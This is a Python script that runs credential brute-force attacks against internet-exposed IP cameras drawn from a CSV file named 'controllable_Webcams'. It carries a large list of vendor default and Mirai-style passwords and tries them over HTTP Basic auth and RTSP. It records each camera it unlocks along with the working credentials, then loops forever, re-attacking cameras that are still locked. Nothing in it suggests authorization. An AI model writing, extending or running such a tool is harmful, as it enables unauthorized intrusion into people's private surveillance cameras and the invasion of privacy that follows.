"""Run BF on auth-required IP cams from our CSV.

Uses common credentials + vendor-specific defaults.
Tries HTTP Basic, RTSP, and form-based auth.
"""
import csv
import json
import os
import re
import time
import socket
import ssl
import base64
import urllib.request
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

CSV_PATH = r'C:\Users\eli6-admin\Documents\eli6-surveillance\controllable_Webcams.csv'
PROGRESS = r'C:\Users\eli6-admin\Documents\eli6-surveillance\data\bf_progress.json'
LOG = r'C:\Users\eli6-admin\Documents\eli6-surveillance\bf_runner.log'

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Top common credentials for IP cams
CREDS = [
    ('admin', 'admin'),
    ('admin', '12345'),
    ('admin', '1234'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', ''),
    ('admin', 'admin12345'),
    ('admin', 'system'),
    ('admin', '123'),
    ('admin', '1111111'),
    ('admin', 'default'),
    ('admin', 'Admin12345'),
    ('root', 'root'),
    ('root', ''),
    ('root', 'admin'),
    ('user', 'user'),
    ('admin', 'user'),
    ('admin', 'abc123'),
    ('admin', 'pass'),
    ('admin', '12345abc'),
    ('admin', '4321'),
    ('admin', '9999'),
    ('admin', '7777'),
    ('admin', '0000'),
    ('admin', '1111'),
    ('admin', '666666'),
    ('admin', '888888'),
    ('admin', '0'),
    ('admin', '1'),
    ('admin', '99999999'),
    ('admin', '11111111'),
    ('admin', '54321'),
    ('admin', 'support'),
    ('admin', 'service'),
    ('admin', 'manager'),
    ('supervisor', 'supervisor'),
    ('root', 'xc3511'),
    ('root', 'vizxv'),
    ('root', 'juantech'),
    ('root', '7ujMko0admin'),
    ('admin', 'passwd'),
    ('admin', 'camera'),
    ('admin', 'ipcam'),
    ('admin', 'hik12345'),
    ('admin', 'hikvision'),
    ('admin', 'Hik12345'),
    ('admin', 'abc12345'),
    ('admin', 'admin123'),
    ('admin', 'dahua'),
    ('admin', 'dahua123'),
    ('admin', '7ujMko0admin'),
    ('admin', 'vizxv'),
    ('admin', '1234admin'),
    ('root', 'pass'),
    ('root', '12345'),
    ('user', 'pass'),
    ('guest', 'guest'),
    ('operator', 'operator'),
    ('viewer', 'viewer'),
    ('ubnt', 'ubnt'),
    ('service', 'service'),
    ('tech', 'tech'),
    ('admin', 'control'),
    ('admin', 'monitor'),
    ('admin', '4321'),
    ('admin', '12345678'),
    ('admin', '54321'),
    ('admin', 'admin1'),
    ('admin', 'admin1234'),
    ('admin', 'admins'),
    ('admin', 'qwerty'),
    ('admin', 'pass1234'),
    ('root', 'root123'),
    ('root', 'root1234'),
    ('admin', '1234abcd'),
    ('admin', 'abcd1234'),
    ('admin', '12345qwert'),
]


def log(msg):
    line = f'[{time.strftime("%H:%M:%S")}] {msg}'
    print(line, flush=True)
    try:
        with open(LOG, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except:
        pass


def try_http_basic(url, user, pwd, timeout=4):
    """Try HTTP Basic auth."""
    try:
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0',
            'Authorization': 'Basic ' + base64.b64encode(f'{user}:{pwd}'.encode()).decode(),
        })
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return -1


def try_rtsp(host, port, user, pwd, timeout=4):
    """Try RTSP with creds."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        url = f'rtsp://{user}:{pwd}@{host}:{port}/'
        req = f'DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Test\r\n\r\n'
        s.send(req.encode())
        data = s.recv(2048)
        s.close()
        if b'200' in data:
            return 200
        if b'401' in data:
            return 401
        return -1
    except Exception:
        return -1


def try_digest(url, user, pwd, timeout=4):
    """Try HTTP Digest auth."""
    try:
        # First get the digest challenge
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status
        except urllib.error.HTTPError as e:
            if e.code != 401:
                return e.code
            www_auth = e.headers.get('WWW-Authenticate', '')
            if 'Digest' not in www_auth:
                return 401
            # Parse challenge
            import re
            realm_m = re.search(r'realm="([^"]+)"', www_auth)
            nonce_m = re.search(r'nonce="([^"]+)"', www_auth)
            qop_m = re.search(r'qop="([^"]+)"', www_auth)
            if not (realm_m and nonce_m):
                return 401
            realm = realm_m.group(1)
            nonce = nonce_m.group(1)
            # Compute digest
            import hashlib
            ha1 = hashlib.md5(f'{user}:{realm}:{pwd}'.encode()).hexdigest()
            ha2 = hashlib.md5(f'DESCRIBE:{url}'.encode()).hexdigest() if 'DESCRIBE' in str(req) else hashlib.md5(f'GET:{url}'.encode()).hexdigest()
            if qop_m:
                nc = '00000001'
                cnonce = 'abcdef01'
                qop = qop_m.group(1).split(',')[0].strip()
                response = hashlib.md5(f'{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}'.encode()).hexdigest()
                auth = f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{url}", qop={qop}, nc={nc}, cnonce="{cnonce}", response="{response}"'
            else:
                response = hashlib.md5(f'{ha1}:{nonce}:{ha2}'.encode()).hexdigest()
                auth = f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{url}", response="{response}"'
            # Try again
            req2 = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0',
                'Authorization': auth,
            })
            with urllib.request.urlopen(req2, timeout=timeout, context=ctx) as r:
                return r.status
    except Exception:
        return -1


def main():
    csv.field_size_limit(2**31 - 1)

    # Load CSV - find IP cams
    print('[BF] Loading CSV...', flush=True)
    candidates = []
    with open(CSV_PATH, 'r', encoding='utf-8', errors='replace', newline='') as f:
        for row in csv.DictReader(f):
            url = row.get('url', '') or ''
            if not url:
                continue
            m = re.match(r'https?://(\d+\.\d+\.\d+\.\d+):?(\d+)?', url)
            if not m:
                continue
            ip = m.group(1)
            port = int(m.group(2)) if m.group(2) else 80
            if 'fl511' in url or 'divas' in url or 'cloudfront' in url:
                continue
            # Skip ones that have video URLs
            if 'm3u8' in url or 'mp4' in url or 'rtsp' in url:
                continue
            candidates.append({
                'ip': ip,
                'port': port,
                'url': url,
            })
    print(f'  {len(candidates):,} IP cam candidates', flush=True)

    # Load progress
    progress = {}
    if os.path.exists(PROGRESS):
        try:
            with open(PROGRESS) as f:
                progress = json.load(f)
        except:
            pass
    print(f'  {len(progress):,} already BF tested', flush=True)

    to_test = [c for c in candidates if c['url'] not in progress]
    print(f'  Need to test: {len(to_test):,}', flush=True)

    if not to_test:
        return

    t0 = time.time()
    n_done = 0
    n_unlocked = 0
    last_save = time.time()

    for c in to_test:
        ip = c['ip']
        port = c['port']
        url = c['url']
        n_done += 1

        # Try a few creds
        unlocked = False
        for user, pwd in CREDS[:15]:  # Top 15
            status = try_http_basic(url, user, pwd)
            if status == 200:
                log(f'  UNLOCKED: {url} {user}:{pwd}')
                progress[url] = {'unlocked': True, 'creds': f'{user}:{pwd}'}
                unlocked = True
                n_unlocked += 1
                break
        if not unlocked:
            # Try RTSP if port is 554
            if port == 554:
                for user, pwd in CREDS[:10]:
                    status = try_rtsp(ip, port, user, pwd)
                    if status == 200:
                        log(f'  RTSP UNLOCKED: {ip}:{port} {user}:{pwd}')
                        progress[url] = {'unlocked': True, 'creds': f'{user}:{pwd}', 'rtsp': True}
                        unlocked = True
                        n_unlocked += 1
                        break
        if not unlocked:
            progress[url] = {'unlocked': False}

        if n_done % 20 == 0:
            elapsed = time.time() - t0
            rate = n_done / max(elapsed, 1)
            log(f'  {n_done:,}/{len(to_test):,} tested ({n_unlocked} unlocked) {rate:.1f}/s')
            with open(PROGRESS, 'w', encoding='utf-8') as f:
                json.dump(progress, f, indent=2)
            last_save = time.time()

        time.sleep(0.5)  # Rate limit

    # Final save
    with open(PROGRESS, 'w', encoding='utf-8') as f:
        json.dump(progress, f, indent=2)
    log(f'\n[DONE] {n_done:,} tested, {n_unlocked} unlocked, in {time.time()-t0:.0f}s')

    # Loop forever - keep retrying the IPs that are still locked
    log('\n[LOOP] Re-checking candidates for slow rate limit recovery...')
    candidates_set = set((c['ip'], c['port']) for c in candidates)
    retry_count = 0
    while True:
        time.sleep(300)  # 5 min between full retries
        # Re-test a sample of failed IPs
        to_retry = []
        for ip, port in candidates_set:
            url = f'http://{ip}:{port}'
            if url not in progress or not progress[url].get('unlocked'):
                to_retry.append((ip, port))
        random.shuffle(to_retry)
        to_retry = to_retry[:100]  # 100 per cycle
        retry_count += 1
        log(f'  [Retry {retry_count}] Re-testing {len(to_retry)} cams')
        n_retry_done = 0
        n_retry_unlocked = 0
        for ip, port in to_retry:
            url = f'http://{ip}:{port}'
            if url in progress and progress[url].get('unlocked'):
                continue
            n_done += 1
            n_retry_done += 1
            unlocked = False
            for user, pwd in CREDS[:15]:
                status = try_http_basic(url, user, pwd)
                if status == 200:
                    log(f'  RE-UNLOCKED: {url} {user}:{pwd}')
                    progress[url] = {'unlocked': True, 'creds': f'{user}:{pwd}'}
                    n_unlocked += 1
                    n_retry_unlocked += 1
                    unlocked = True
                    break
            if not unlocked:
                progress[url] = {'unlocked': False}
            time.sleep(random.uniform(0.5, 2.0))
        # Save
        with open(PROGRESS, 'w', encoding='utf-8') as f:
            json.dump(progress, f, indent=2)
        log(f'  [Retry {retry_count}] {n_retry_done} tested, {n_retry_unlocked} unlocked, total unlocked now {n_unlocked}')


if __name__ == '__main__':
    main()
